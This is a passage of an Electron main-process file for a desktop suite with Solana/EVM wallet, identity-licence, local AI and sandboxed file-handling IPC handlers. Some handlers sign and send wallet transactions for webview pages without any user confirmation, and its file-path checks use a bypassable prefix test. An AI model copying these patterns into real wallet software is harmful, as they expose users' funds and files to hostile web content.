    let targetWindowId = windowId;
    if (!targetWindowId) {
      // Auto-detect from sender
      for (const [id, appData] of appWindows.entries()) {
        if (appData.window.webContents.id === event.sender.id) {
          targetWindowId = id;
          break;
        }
      }
    }
    const appData = appWindows.get(targetWindowId);
    if (appData && appData.window) {
      if (appData.window.isMaximized()) {
        appData.window.unmaximize();
      } else {
        appData.window.maximize();
      }
    }
  });

  ipcMain.on('app-window-close', (event, windowId) => {
    let targetWindowId = windowId;
    if (!targetWindowId) {
      // Auto-detect from sender
      for (const [id, appData] of appWindows.entries()) {
        if (appData.window.webContents.id === event.sender.id) {
          targetWindowId = id;
          break;
        }
      }
    }
    const appData = appWindows.get(targetWindowId);
    if (appData && appData.window) appData.window.close();
  });

  // Wallet IPC Handlers
  ipcMain.handle('wallet-create', async (event, password, secretKeyBase64 = null) => {
    try {
      return await wallet.createWallet(password, secretKeyBase64);
    } catch (error) {
      throw error;
    }
  });

  ipcMain.handle('wallet-import-from-private-key', async (event, privateKeyBase58, password) => {
    try {
      const bs58 = require('bs58');
      const { Keypair } = require('@solana/web3.js');
      const keypair = Keypair.fromSecretKey(bs58.decode(privateKeyBase58));
      const secretKeyBase64 = Buffer.from(keypair.secretKey).toString('base64');
      return await wallet.createWallet(password, secretKeyBase64);
    } catch (error) {
      throw error;
    }
  });

  ipcMain.handle('wallet-load', async (event, password) => {
    try {
      return await wallet.loadWallet(password);
    } catch (error) {
      throw error;
    }
  });

  ipcMain.handle('wallet-get-balance', async () => {
    try {
      return await wallet.getBalance();
    } catch (error) {
      throw error;
    }
  });

  ipcMain.handle('wallet-get-public-key', () => {
    return wallet.getPublicKey();
  });

  ipcMain.handle('wallet-send-sol', async (event, toAddress, amount) => {
    try {
      return await wallet.sendSol(toAddress, amount);
    } catch (error) {
      throw error;
    }
  });

  ipcMain.handle('wallet-has-wallet', () => {
    return wallet.hasWallet();
  });

  ipcMain.handle('wallet-is-loaded', () => {
    return wallet.isLoaded();
  });

  ipcMain.handle('wallet-sign-transaction', async (event, transactionData) => {
    try {
      const { Transaction } = require('@solana/web3.js');
      const transaction = Transaction.from(Buffer.from(transactionData, 'base64'));
      const signed = await wallet.signTransaction(transaction);
      return signed.serialize({ requireAllSignatures: false }).toString('base64');
    } catch (error) {
      throw error;
    }
  });

  ipcMain.handle('wallet-sign-message', async (event, message) => {
    try {
      return await wallet.signMessage(message);
    } catch (error) {
      throw error;
    }
  });

  // Extension IPC Handlers - Removed (extensions not supported, using WalletConnect instead)
  ipcMain.handle('extensions-get-loaded', async () => {
    // Extensions removed - return empty array
    return [];
  });

  // Get preload script path for webviews
  ipcMain.handle('get-preload-path', () => {
    return path.join(__dirname, 'webview-preload.js');
  });

  // Extension popup handler - Removed (extensions not supported)
  ipcMain.handle('extensions-open-popup', async (event, electronExtensionId) => {
    // Extensions removed - return failure
    return { success: false, error: 'Extensions not supported. Use WalletConnect instead.' };
  });

  // EVM Wallet Handlers
  ipcMain.handle('wallet-get-evm-address', () => {
    return wallet.getEvmAddress();
  });

  ipcMain.handle('wallet-get-evm-balance', async (event, chainId) => {
    try {
      return await wallet.getEvmBalance(chainId || 1);
    } catch (error) {
      throw error;
    }
  });

  ipcMain.handle('wallet-sign-evm-transaction', async (event, transaction) => {
    try {
      return await wallet.signEvmTransaction(transaction);
    } catch (error) {
      throw error;
    }
  });

  ipcMain.handle('wallet-sign-evm-message', async (event, message) => {
    try {
      return await wallet.signEvmMessage(message);
    } catch (error) {
      throw error;
    }
  });

  ipcMain.handle('wallet-send-evm-transaction', async (event, to, value, data, chainId) => {
    try {
      return await wallet.sendEvmTransaction(to, value, data, chainId || 1);
    } catch (error) {
      throw error;
    }
  });

  // Open external URL in default browser
  ipcMain.handle('open-external-url', async (event, url) => {
    try {
      shell.openExternal(url);
      return { success: true };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  // Omega Wallet Provider IPC Handlers (for webview preload)
  ipcMain.handle('omega-wallet-request', async (event, request) => {
    try {
      let response;

      switch (request.action) {
        case 'connect':
          const publicKey = wallet.getPublicKey();
          if (!publicKey) {
            response = { error: 'Wallet not unlocked. Please unlock Omega Wallet first.' };
          } else {
            response = { publicKey: publicKey };
          }
          break;

        case 'signTransaction':
          // request.data is base64 encoded serialized transaction
          // We need to deserialize, sign, and return base64
          try {
            const { Transaction } = require('@solana/web3.js');
            const transactionBytes = Buffer.from(request.data, 'base64');
            const transaction = Transaction.from(transactionBytes);
            const signedTx = await wallet.signTransaction(transaction);
            const serialized = signedTx.serialize();
            const base64 = Buffer.from(serialized).toString('base64');
            response = { data: base64 };

            // Notify wallet window of app interaction
            notifyWalletAppInteraction('app_interaction', {
              type: 'signTransaction',
              network: 'solana',
              action: 'Signed Transaction',
              source: request.source || 'External App'
            });
          } catch (error) {
            response = { error: error.message };
          }
          break;

        case 'signMessage':
          // request.data is the message string
          try {
            const signature = await wallet.signMessage(request.data);
            // Return base64 encoded signature bytes
            const { bs58 } = require('bs58');
            const signatureBytes = bs58.decode(signature);
            const base64 = Buffer.from(signatureBytes).toString('base64');
            response = { data: base64 };

            // Notify wallet window of app interaction
            notifyWalletAppInteraction('app_interaction', {
              type: 'signMessage',
              network: 'solana',
              action: 'Signed Message',
              source: request.source || 'External App'
            });
          } catch (error) {
            response = { error: error.message };
          }
          break;

        default:
          response = { error: 'Unknown action' };
      }

      return response;
    } catch (error) {
      return { error: error.message };
    }
  });

  ipcMain.handle('omega-evm-request', async (event, request) => {
    try {
      let response;

      switch (request.method) {
        case 'eth_requestAccounts':
        case 'eth_accounts':
          const evmAddress = wallet.getEvmAddress();
          if (!evmAddress) {
            response = { error: 'Wallet not unlocked. Please unlock Omega Wallet first.' };
          } else {
            response = { result: [evmAddress] };
          }
          break;

        case 'eth_chainId':
          response = { result: '0x1' }; // Ethereum mainnet
          break;

        case 'eth_getBalance':
          const address = request.params[0];
          const chainId = parseInt(request.params[1] || '0x1', 16);
          const balance = await wallet.getEvmBalance(chainId);
          const balanceWei = BigInt(Math.floor(parseFloat(balance) * 1e18)).toString(16);
          response = { result: '0x' + balanceWei };
          break;

        case 'eth_sendTransaction':
          const tx = request.params[0];
          const valueHex = tx.value || '0x0';
          const valueWei = BigInt(valueHex);
          const valueEth = (Number(valueWei) / 1e18).toString();
          const txChainId = parseInt(tx.chainId || '0x1', 16);
          const txHash = await wallet.sendEvmTransaction(tx.to, valueEth, tx.data || '0x', txChainId);
          response = { result: txHash };

          // Notify wallet window of app interaction
          const chainName = txChainId === 1313161768 ? 'omega' : txChainId === 56 ? 'bsc' : 'evm';
          notifyWalletAppInteraction('app_interaction', {
            type: 'send',
            network: chainName,
            action: 'Sent Transaction',
            source: request.source || 'External App',
            hash: txHash,
            to: tx.to,
            amount: valueEth,
            symbol: chainName === 'omega' ? 'OMEGA' : chainName === 'bsc' ? 'BNB' : 'ETH'
          });
          break;

        case 'eth_sign':
        case 'personal_sign':
          const message = request.params[0] || request.params[1];
          const signature = await wallet.signEvmMessage(message);
          response = { result: signature };

          // Notify wallet window of app interaction
          notifyWalletAppInteraction('app_interaction', {
            type: 'signMessage',
            network: 'evm',
            action: 'Signed Message',
            source: request.source || 'External App'
          });
          break;

        case 'eth_signTransaction':
          const signedTx = await wallet.signEvmTransaction(request.params[0]);
          response = { result: signedTx };

          // Notify wallet window of app interaction
          notifyWalletAppInteraction('app_interaction', {
            type: 'signTransaction',
            network: 'evm',
            action: 'Signed Transaction',
            source: request.source || 'External App'
          });
          break;

        default:
          response = { error: 'Method not supported: ' + request.method };
      }

      return response;
    } catch (error) {
      return { error: error.message };
    }
  });

  ipcMain.handle('wallet-export-private-key', async (event, password) => {
    try {
      return await wallet.exportPrivateKey(password);
    } catch (error) {
      throw error;
    }
  });

  // Multi-wallet IPC Handlers
  ipcMain.handle('wallet-create-for-network', async (event, password, network, name = null) => {
    try {
      return await wallet.createWalletForNetwork(password, network, name);
    } catch (error) {
      throw error;
    }
  });

  ipcMain.handle('wallet-update-name', async (event, walletId, name) => {
    try {
      return wallet.updateWalletName(walletId, name);
    } catch (error) {
      throw error;
    }
  });

  ipcMain.handle('wallet-get-wallets-for-network', async (event, network) => {
    try {
      return wallet.getWalletsForNetwork(network);
    } catch (error) {
      throw error;
    }
  });

  ipcMain.handle('wallet-set-current-wallet', async (event, network, walletId, password) => {
    try {
      // Load the wallet to verify password
      await wallet.loadWalletById(password, walletId, network);
      wallet.setCurrentWalletId(network, walletId);
      return { success: true };
    } catch (error) {
      throw error;
    }
  });

  ipcMain.handle('wallet-get-current-wallet-id', async (event, network) => {
    try {
      return wallet.getCurrentWalletId(network);
    } catch (error) {
      throw error;
    }
  });

  ipcMain.handle('wallet-delete', async (event, walletId) => {
    try {
      return wallet.deleteWallet(walletId);
    } catch (error) {
      throw error;
    }
  });

  ipcMain.handle('wallet-cleanup-duplicates', async (event) => {
    try {
      return wallet.cleanupDuplicateWallets();
    } catch (error) {
      throw error;
    }
  });

  ipcMain.handle('wallet-load-by-network', async (event, password, network) => {
    try {
      return await wallet.loadWallet(password, network);
    } catch (error) {
      throw error;
    }
  });

  // Wallet network toggle (global handler - checks which window is calling)
  // Remove existing handler first to avoid duplicates
  try {
    ipcMain.removeHandler('wallet-toggle-network');
  } catch (e) {
    // Handler doesn't exist yet, that's fine
  }

  ipcMain.handle('wallet-toggle-network', (event, enable) => {
    // Find the wallet window that's making this request
    for (const [windowId, appData] of appWindows.entries()) {
      if (appData.window && appData.window.webContents && appData.window.webContents.id === event.sender.id) {
        if (appData.type === 'wallet') {
          appData.walletNetworkEnabled = enable;
          return true;
        }
      }
    }
    return false;
  });

  // Omega Identity IPC Handlers
  ipcMain.handle('identity-initialize', async (event) => {
    try {
      if (!wallet.isLoaded()) {
        return { success: false, error: 'Wallet not loaded. Please unlock wallet first.' };
      }

      const evmWallet = wallet.getEvmWallet();
      if (!evmWallet) {
        return { success: false, error: 'EVM wallet not available.' };
      }

      const result = await identityManager.createOrLoadIdentity(evmWallet);
      return { success: true, ...result };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('identity-get', () => {
    try {
      const identity = identityManager.getIdentity();
      if (!identity) {
        return { success: false, error: 'Identity not initialized' };
      }
      return { success: true, identity: identity };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('identity-has-identity', () => {
    return identityManager.hasIdentity();
  });

  ipcMain.handle('identity-sync-document', async (event, documentId, documentHash, metadata) => {
    try {
      if (!wallet.isLoaded()) {
        return { success: false, error: 'Wallet not loaded' };
      }

      const evmWallet = wallet.getEvmWallet();
      if (!evmWallet) {
        return { success: false, error: 'EVM wallet not available' };
      }

      await identityManager.initializeProvider(evmWallet);
      const result = await identityManager.syncDocumentHash(documentId, documentHash, metadata);
      return result;
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('identity-get-synced-documents', async (event) => {
    try {
      if (!wallet.isLoaded()) {
        return { success: false, documents: [] };
      }

      const evmWallet = wallet.getEvmWallet();
      if (!evmWallet) {
        return { success: false, documents: [] };
      }

      await identityManager.initializeProvider(evmWallet);
      const documents = await identityManager.getSyncedDocuments();
      return { success: true, documents: documents };
    } catch (error) {
      return { success: false, documents: [], error: error.message };
    }
  });

  ipcMain.handle('identity-check-license', async (event) => {
    try {
      if (!wallet.isLoaded()) {
        return { hasLicense: false, licenseType: 'None', reason: 'Wallet not loaded' };
      }

      await identityManager.initializeProvider(wallet.getEvmWallet());
      const result = await identityManager.checkLicense();
      return result;
    } catch (error) {
      return { hasLicense: false, licenseType: 'None', reason: error.message };
    }
  });

  ipcMain.handle('identity-get-license-details', async (event) => {
    try {
      if (!wallet.isLoaded()) {
        return null;
      }

      await identityManager.initializeProvider(wallet.getEvmWallet());
      const details = await identityManager.getLicenseDetails();
      return details;
    } catch (error) {
      console.error('Failed to get license details:', error);
      return null;
    }
  });

  ipcMain.handle('identity-get-license-pricing', async (event) => {
    try {
      await identityManager.initializeProvider(wallet.getEvmWallet());
      const pricing = await identityManager.getLicensePricing();
      return pricing;
    } catch (error) {
      console.error('Failed to get license pricing:', error);
      // Return defaults
      return {
        stakingAmount: '1000000000000000000000', // 1000 * 10^18
        purchaseAmount: '10000000000000000000000', // 10000 * 10^18
        stakingPeriod: 30 * 24 * 60 * 60
      };
    }
  });

  ipcMain.handle('identity-stake-for-license', async (event) => {
    try {
      if (!wallet.isLoaded()) {
        return { success: false, error: 'Wallet not loaded' };
      }

      const evmWallet = wallet.getEvmWallet();
      if (!evmWallet) {
        return { success: false, error: 'EVM wallet not available' };
      }

      await identityManager.initializeProvider(evmWallet);
      const result = await identityManager.stakeForLicense();
      return result;
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('identity-purchase-license', async (event) => {
    try {
      if (!wallet.isLoaded()) {
        return { success: false, error: 'Wallet not loaded' };
      }

      const evmWallet = wallet.getEvmWallet();
      if (!evmWallet) {
        return { success: false, error: 'EVM wallet not available' };
      }

      await identityManager.initializeProvider(evmWallet);
      const result = await identityManager.purchaseLicense();
      return result;
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('identity-withdraw-stake', async (event) => {
    try {
      if (!wallet.isLoaded()) {
        return { success: false, error: 'Wallet not loaded' };
      }

      const evmWallet = wallet.getEvmWallet();
      if (!evmWallet) {
        return { success: false, error: 'EVM wallet not available' };
      }

      await identityManager.initializeProvider(evmWallet);
      const result = await identityManager.withdrawStake();
      return result;
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('identity-authenticate', async (event, message) => {
    try {
      if (!wallet.isLoaded()) {
        return { success: false, error: 'Wallet not loaded' };
      }

      const evmWallet = wallet.getEvmWallet();
      if (!evmWallet) {
        return { success: false, error: 'EVM wallet not available' };
      }

      await identityManager.initializeProvider(evmWallet);
      const result = await identityManager.authenticate(message);
      return result;
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('identity-verify-signature', async (event, message, signature, address) => {
    try {
      const isValid = await identityManager.verifySignature(message, signature, address);
      return { success: true, isValid: isValid };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  // Clipboard operations
  ipcMain.handle('clipboard-write-text', (event, text) => {
    try {
      clipboard.writeText(text);
      return { success: true };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  // AI Service IPC Handlers
  ipcMain.handle('ai-chat', async (event, message, history = [], options = {}) => {
    try {
      const response = await aiService.chat(message, history, options);
      return { success: true, response };
    } catch (error) {
      console.error('[AI IPC] Chat error:', error);
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('ai-summarize-page', async (event, content, maxLength = 200) => {
    try {
      const summary = await aiService.summarizePage(content, maxLength);
      return { success: true, summary };
    } catch (error) {
      console.error('[AI IPC] Summarize page error:', error);
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('ai-improve-text', async (event, text, style = 'neutral', task = 'improve') => {
    try {
      const improved = await aiService.improveText(text, style, task);
      return { success: true, text: improved };
    } catch (error) {
      console.error('[AI IPC] Improve text error:', error);
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('ai-suggest-formula', async (event, description, dataContext = null) => {
    try {
      const formula = await aiService.suggestFormula(description, dataContext);
      return { success: true, formula };
    } catch (error) {
      console.error('[AI IPC] Suggest formula error:', error);
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('ai-analyze-data', async (event, dataDescription, dataSample = null) => {
    try {
      const analysis = await aiService.analyzeData(dataDescription, dataSample);
      return { success: true, analysis };
    } catch (error) {
      console.error('[AI IPC] Analyze data error:', error);
      return { success: false, error: error.message };
    }
  });

  // Update AI configuration for specific app
  ipcMain.handle('update-ai-config', async (event, appName, config) => {
    try {
      aiService.updateAppConfig(appName, config);
      return { success: true };
    } catch (error) {
      console.error('[AI IPC] Update config error:', error);
      return { success: false, error: error.message };
    }
  });

  // Get AI configuration for specific app
  ipcMain.handle('get-ai-config', async (event, appName) => {
    try {
      const config = aiService.getAppConfig(appName);
      return { success: true, config };
    } catch (error) {
      console.error('[AI IPC] Get config error:', error);
      return { success: false, error: error.message };
    }
  });

  // Switch AI model for specific app type (Word, Excel, PowerPoint)
  ipcMain.handle('ai-switch-model-for-app', async (event, appType) => {
    try {
      const model = await aiService.switchModelForApp(appType);
      return { success: true, model };
    } catch (error) {
      console.error('[AI IPC] Switch model error:', error);
      return { success: false, error: error.message };
    }
  });

  // Get recommended models for content generation
  ipcMain.handle('ai-get-content-models', async (event) => {
    try {
      const models = aiService.getRecommendedContentModels();
      return { success: true, models };
    } catch (error) {
      console.error('[AI IPC] Get content models error:', error);
      return { success: false, error: error.message };
    }
  });

  // Get recommended models for code generation
  ipcMain.handle('ai-get-code-models', async (event) => {
    try {
      const models = aiService.getRecommendedCodeModels();
      return { success: true, models };
    } catch (error) {
      console.error('[AI IPC] Get code models error:', error);
      return { success: false, error: error.message };
    }
  });

  // Select best available model automatically
  ipcMain.handle('ai-select-best-model', async (event, preferenceList = null) => {
    try {
      const model = await aiService.selectBestAvailableModel(preferenceList);
      return { success: true, model };
    } catch (error) {
      console.error('[AI IPC] Select best model error:', error);
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('ai-check-ready', async () => {
    try {
      const check = await aiService.checkOllama();
      return { ready: check.available, loading: aiService.isLoadingModel(), available: check.available };
    } catch (error) {
      return { ready: false, loading: false, available: false, error: error.message };
    }
  });

  ipcMain.handle('ai-get-models', async () => {
    try {
      const models = await aiService.getAvailableModels();
      return { success: true, models };
    } catch (error) {
      return { success: false, error: error.message, models: [] };
    }
  });

  ipcMain.handle('ai-set-model', async (event, modelName) => {
    try {
      aiService.setModel(modelName);
      return { success: true };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('ai-get-current-model', async () => {
    try {
      return { success: true, model: aiService.getCurrentModel() };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });


  ipcMain.handle('ai-get-recommended-models', async () => {
    try {
      return { success: true, models: aiService.getRecommendedCodeModels() };
    } catch (error) {
      return { success: false, error: error.message, models: [] };
    }
  });

  ipcMain.handle('ai-pull-model', async (event, modelName) => {
    try {
      const axios = require('axios');
      const ollamaUrl = 'http://127.0.0.1:11434';

      // Ollama is localhost, so it should bypass proxy (handled by shouldBypassProxy)
      // But we'll explicitly not use proxy for localhost connections
      const proxyUrl = shouldBypassProxy(ollamaUrl) ? null : getCurrentProxyForNode();
      let axiosConfig = { timeout: 600000 }; // 10 minute timeout

      // Only configure proxy if not localhost and proxy is available
      if (proxyUrl && !shouldBypassProxy(ollamaUrl)) {
        const { SocksProxyAgent } = require('socks-proxy-agent');
        axiosConfig.httpAgent = new SocksProxyAgent(proxyUrl);
        axiosConfig.httpsAgent = new SocksProxyAgent(proxyUrl);
      }

      // Start pull request
      await axios.post(`${ollamaUrl}/api/pull`, {
        name: modelName,
        stream: false
      }, axiosConfig);

      return { success: true };
    } catch (error) {
      console.error('[AI] Pull model error:', error);
      return { success: false, error: error.message };
    }
  });

  // Fetch Website HTML
  ipcMain.handle('fetch-website', async (event, url) => {
    try {
      const https = require('https');
      const http = require('http');
      const { URL } = require('url');

      const urlObj = new URL(url);
      const proxyUrl = getCurrentProxyForNode();
      const agent = createHttpAgent(url, proxyUrl);

      const client = urlObj.protocol === 'https:' ? https : http;
      const options = {
        ...urlObj,
        agent: agent
      };

      return new Promise((resolve) => {
        const request = client.get(options, (response) => {
          let data = '';

          response.on('data', (chunk) => {
            data += chunk;
          });

          response.on('end', () => {
            resolve({ success: true, html: data });
          });
        });

        request.on('error', (error) => {
          resolve({ success: false, error: error.message });
        });

        request.setTimeout(10000, () => {
          request.destroy();
          resolve({ success: false, error: 'Request timeout' });
        });
      });
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  // File Operations (isolated environment only)
  ipcMain.handle('save-file-dialog', async (event, options = {}) => {
    try {
      const window = BrowserWindow.fromWebContents(event.sender);
      const result = await dialog.showSaveDialog(window, {
        title: 'Save File',
        defaultPath: options.defaultPath ? path.join(ISOLATED_DOCUMENTS_PATH, options.defaultPath) : ISOLATED_DOCUMENTS_PATH,
        filters: options.filters || [
          { name: 'All Files', extensions: ['*'] }
        ],
        // Restrict to isolated documents directory
        properties: ['createDirectory']
      });

      // Validate that the save path is within isolated environment
      if (result.filePath && !result.filePath.startsWith(ISOLATED_DATA_PATH)) {
        throw new Error('File operations are restricted to the isolated environment');
      }

      return result;
    } catch (error) {
      throw error;
    }
  });

  ipcMain.handle('open-file-dialog', async (event, options = {}) => {
    try {
      const window = BrowserWindow.fromWebContents(event.sender);
      const result = await dialog.showOpenDialog(window, {
        title: 'Open File',
        defaultPath: ISOLATED_DOCUMENTS_PATH,
        filters: options.filters || [
          { name: 'All Files', extensions: ['*'] }
        ],
        properties: ['openFile']
      });

      // Validate that all selected files are within isolated environment
      if (result.filePaths) {
        for (const filePath of result.filePaths) {
          if (!filePath.startsWith(ISOLATED_DATA_PATH)) {
            throw new Error('File operations are restricted to the isolated environment');
          }
        }
      }

      return result;
    } catch (error) {
      throw error;
    }
  });

  // Read file from absolute path (for background images only)
  ipcMain.handle('read-file-from-path', async (event, filePath, encoding = 'base64') => {
    try {
      // Only allow image files for security
      const allowedExtensions = ['.png', '.jpg', '.jpeg', '.gif', '.webp', '.bmp', '.svg'];
      const ext = path.extname(filePath).toLowerCase();
      if (!allowedExtensions.includes(ext)) {
        throw new Error('Only image files are allowed');
      }

      // Check if file exists
      if (!fs.existsSync(filePath)) {
        throw new Error('File not found');
      }

      // Read file
      if (encoding === 'base64') {
        const buffer = fs.readFileSync(filePath);
        return buffer.toString('base64');
      } else {
        return fs.readFileSync(filePath, encoding);
      }
    } catch (error) {
      throw error;
    }
  });

  ipcMain.handle('read-file', async (event, filePath, encoding = 'utf8') => {
    try {
      // Validate path is within isolated environment
      if (!filePath.startsWith(ISOLATED_DATA_PATH)) {
        throw new Error('File access is restricted to the isolated environment');
      }

      // Notify privacy monitor
      const appName = getAppNameFromWindow(event.sender);
      notifyPrivacyMonitor('read', filePath, appName);

      if (encoding === 'base64') {
        // Return as base64 for binary files
        const buffer = fs.readFileSync(filePath);
        return buffer.toString('base64');
      } else {
        // Return as text (UTF-8)
        return fs.readFileSync(filePath, 'utf-8');
      }
    } catch (error) {
      throw error;
    }
  });

  ipcMain.handle('write-file', async (event, filePath, content, encoding = 'utf8') => {
    try {
      // Validate path is within isolated environment
      if (!filePath.startsWith(ISOLATED_DATA_PATH)) {
        throw new Error('File access is restricted to the isolated environment');
      }

      // Ensure directory exists
      const dir = path.dirname(filePath);
      if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
      }

      if (encoding === 'base64') {
        // Write binary file from base64
        const buffer = Buffer.from(content, 'base64');
        fs.writeFileSync(filePath, buffer);
      } else {
        // Write as text (UTF-8)
        fs.writeFileSync(filePath, content, 'utf-8');
      }

      // Notify privacy monitor after successful write
      const appName = getAppNameFromWindow(event.sender);
      notifyPrivacyMonitor('write', filePath, appName);

      return true;
    } catch (error) {
      throw error;
    }
  });

  // File conversion handlers
  ipcMain.handle('convert-to-docx', async (event, htmlContent, filePath) => {
    try {
      // Validate path
      if (!filePath.startsWith(ISOLATED_DATA_PATH)) {
        throw new Error('File access is restricted to the isolated environment');
      }

      // Ensure directory exists
      const dir = path.dirname(filePath);
      if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
      }

      // Validate input
      if (!htmlContent || typeof htmlContent !== 'string') {
        throw new Error('Invalid HTML content provided');
      }

      // Polyfill browser APIs if needed (some libraries might expect them)
      if (typeof File === 'undefined') {
        global.File = class File {
          constructor(bits, name, options = {}) {
            this.name = name;
            this.lastModified = options.lastModified || Date.now();
            this.size = Array.isArray(bits) ? bits.reduce((sum, b) => sum + (b.byteLength || b.length || 0), 0) : (bits?.length || 0);
            this.type = options.type || '';
            this._bits = bits;
          }
        };
      }

      const { Document, Packer, Paragraph, TextRun, HeadingLevel } = require('docx');

      // Parse HTML and convert to docx format
      const cheerio = require('cheerio');
      const $ = cheerio.load(htmlContent || '<body></body>');

      const children = [];
      const processed = new Set();

      // Process block-level elements only (to avoid duplicates)
      const blockElements = $('h1, h2, h3, h4, h5, h6, p, div, li');

      blockElements.each((i, elem) => {
        // Skip if this element is inside another block element we've already processed
        let parent = $(elem).parent()[0];
        let skip = false;
        while (parent) {
          if (processed.has(parent)) {
            skip = true;
            break;
          }
          parent = $(parent).parent()[0];
        }

        if (skip) return;
        processed.add(elem);

        const tag = elem.tagName?.toLowerCase();
        const text = $(elem).text().trim();

        if (!text) return;

        // Handle headings
        if (tag === 'h1') {
          children.push(new Paragraph({
            text: text,
            heading: HeadingLevel.HEADING_1
          }));
        } else if (tag === 'h2') {
          children.push(new Paragraph({
            text: text,
            heading: HeadingLevel.HEADING_2
          }));
        } else if (tag === 'h3') {
          children.push(new Paragraph({
            text: text,
            heading: HeadingLevel.HEADING_3
          }));
        } else if (tag === 'h4' || tag === 'h5' || tag === 'h6') {
          children.push(new Paragraph({
            text: text,
            heading: HeadingLevel.HEADING_3 // Use H3 for smaller headings
          }));
        } else if (tag === 'p' || tag === 'div' || tag === 'li') {
          // Check for formatting
          const runs = [];
          $(elem).contents().each((j, node) => {
            if (node.type === 'text') {
              const nodeText = node.data.trim();
              if (nodeText) {
                runs.push(new TextRun(nodeText));
              }
            } else if (node.tagName === 'strong' || node.tagName === 'b') {
              const nodeText = $(node).text().trim();
              if (nodeText) {
                runs.push(new TextRun({ text: nodeText, bold: true }));
              }
            } else if (node.tagName === 'em' || node.tagName === 'i') {
              const nodeText = $(node).text().trim();
              if (nodeText) {
                runs.push(new TextRun({ text: nodeText, italics: true }));
              }
            } else if (node.tagName === 'u') {
              const nodeText = $(node).text().trim();
              if (nodeText) {
                runs.push(new TextRun({ text: nodeText, underline: {} }));
              }
            }
          });

          if (runs.length === 0) {
            runs.push(new TextRun(text));
          }

          children.push(new Paragraph({ children: runs }));
        }
      });

      // If no children, add the plain text
      if (children.length === 0) {
        const plainText = $('body').text() || htmlContent.replace(/<[^>]*>/g, '').trim();
        if (plainText) {
          children.push(new Paragraph({ text: plainText }));
        }
      }

      const doc = new Document({
        sections: [{
          children: children
        }]
      });

      // Generate and save
      const buffer = await Packer.toBuffer(doc);
      fs.writeFileSync(filePath, buffer);

      // Notify privacy monitor
      const appName = getAppNameFromWindow(event.sender);
      notifyPrivacyMonitor('write', filePath, appName);

      return { success: true };
    } catch (error) {
      console.error('DOCX conversion error:', error);
      console.error('Error stack:', error.stack);
      console.error('Error details:', {
        message: error.message,
        name: error.name,
        code: error.code
      });
      return { success: false, error: error.message + (error.stack ? '\n' + error.stack.split('\n')[0] : '') };
    }
  });

  ipcMain.handle('convert-to-pptx', async (event, slidesData, filePath) => {
    try {
      // Validate path
      if (!filePath.startsWith(ISOLATED_DATA_PATH)) {
        throw new Error('File access is restricted to the isolated environment');
      }

      // Ensure directory exists first
      const dir = path.dirname(filePath);
      if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
      }

      // Polyfill browser APIs for Node.js
      if (typeof File === 'undefined') {
        global.File = class File {
          constructor(bits, name, options = {}) {
            this.name = name;
            this.lastModified = options.lastModified || Date.now();
            this.size = Array.isArray(bits) ? bits.reduce((sum, b) => sum + (b.byteLength || b.length || 0), 0) : (bits?.length || 0);
            this.type = options.type || '';
            this._bits = bits;
          }
        };
      }

      if (typeof Blob === 'undefined') {
        global.Blob = class Blob {
          constructor(parts = [], options = {}) {
            this.size = 0;
            this.type = options.type || '';
            this._parts = parts;
          }
        };
      }

      // Use dynamic require to avoid issues
      const PptxGenJS = require('pptxgenjs');

      // Create presentation with Node.js compatibility
      const pptx = new PptxGenJS();

      // Process each slide
      if (Array.isArray(slidesData) && slidesData.length > 0) {
        slidesData.forEach((slideData, index) => {
          const slide = pptx.addSlide();

          // Use default white background
          slide.background = { color: 'FFFFFF' };

          // Parse slide content
          const cheerio = require('cheerio');
          const $ = cheerio.load(slideData.content || '');

          // Extract all text content
          const allText = $('body').text() || $('*').text() || '';
          const textLines = allText.split('\n').filter(line => line.trim().length > 0);

          // Extract text boxes and content more carefully
          const textBoxes = $('.slide-textbox');
          let yPos = 0.5;

          if (textBoxes.length > 0) {
            textBoxes.each((i, elem) => {
              const text = $(elem).text().trim();
              if (text && text.length > 0) {
                const isTitle = i === 0 && text.length < 100;
                slide.addText(text, {
                  x: 0.5,
                  y: yPos,
                  w: 9,
                  h: isTitle ? 1 : 0.5,
                  fontSize: isTitle ? 32 : 14,
                  bold: isTitle,
                  align: isTitle ? 'center' : 'left'
                });
                yPos += isTitle ? 1.5 : 0.7;
              }
            });
          } else {
            // Fallback: use text lines
            textLines.forEach((line, i) => {
              if (line.trim()) {
                const isTitle = i === 0;
                slide.addText(line.trim(), {
                  x: 0.5,
                  y: yPos,
                  w: 9,
                  h: isTitle ? 1 : 0.5,
                  fontSize: isTitle ? 32 : 14,
                  bold: isTitle,
                  align: isTitle ? 'center' : 'left'
                });
                yPos += isTitle ? 1.5 : 0.7;
              }
            });
          }

          // If still no content, add placeholder
          if (textBoxes.length === 0 && textLines.length === 0) {
            slide.addText(`Slide ${index + 1}`, {
              x: 0.5,
              y: 0.5,
              w: 9,
              h: 1,
              fontSize: 32,
              align: 'center'
            });
          }
        });
      } else {
        // Add at least one slide
        const slide = pptx.addSlide();
        slide.addText('Empty Presentation', {
          x: 0.5,
          y: 0.5,
          w: 9,
          h: 1,
          fontSize: 32,
          align: 'center'
        });
      }

      // Save the presentation
      // For Node.js, we need to handle the file writing differently
      // Try using writeFile which should work in Node.js
      try {
        await pptx.writeFile({ fileName: filePath });
      } catch (writeError) {
        // If writeFile fails, try to get buffer and write manually
